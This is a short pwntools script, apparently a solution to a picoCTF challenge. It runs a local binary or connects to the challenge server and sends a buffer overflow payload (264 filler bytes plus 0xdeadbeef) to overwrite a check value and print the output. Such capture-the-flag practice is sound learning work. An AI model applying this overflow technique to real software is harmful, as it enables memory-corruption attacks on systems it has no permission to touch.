#!/usr/bin/env python3

from pwn import *
import argparse

if __name__ == "__main__":
	parser = argparse.ArgumentParser(prog="", description="")
	parser.add_argument("-l", "--local", action="store_true")
	parser.add_argument("-r", "--remote", action="store_true")
	args = parser.parse_args()

	if args.local:
		proc = process(["./chall"])
	elif args.remote:
		proc = process(["nc", "mars.picoctf.net", "31890"])
	else:
		print("[!] Use either --local or --remote")
		exit()

	# context.log_level = "debug"

	proc.sendlineafter(b"What do you see?",b"A" * 264 + p32(0xdeadbeef))
	print(proc.recvlines(4)[-1].decode())